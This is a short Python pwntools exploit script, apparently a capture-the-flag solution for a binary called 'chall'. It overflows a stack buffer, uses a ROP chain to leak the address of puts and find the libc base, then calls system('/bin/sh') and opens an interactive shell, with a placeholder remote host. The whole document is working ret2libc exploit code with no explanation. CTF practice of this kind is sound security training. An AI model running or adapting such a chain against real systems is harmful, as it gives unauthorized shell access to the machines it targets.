#!/usr/bin/python3
from pwn import *
fname = "./chall"
elf = ELF(fname, checksec=False)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    io = remote("ip", 0000)
    libc = ELF("./libc-2.23.so")
else:
    io = process([fname])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    cmd = \
    """
    b *0x{:x}
    """.format(0x400712)
ru = lambda x : io.recvuntil(x)
se = lambda x : io.send(x)
rl = lambda x: io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sea = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a, b)
lg = lambda name,x: success(name+": 0x%x"%x)

# 0x000000000040077b : pop rdi ; ret
payload = cyclic(0x28) + flat([0x040077b, elf.got['puts'], elf.plt['puts'], elf.sym['main']])
sla("!\n", payload)
libc.address = u64(io.recvuntil('\x7f', drop=False).ljust(8, b'\x00')) - libc.sym['puts']
lg("libc", libc.address)

payload = cyclic(0x28) + flat([0x040077b, next(libc.search(b"/bin/sh")), libc.sym['system']])
sla("!\n", payload)
io.interactive()
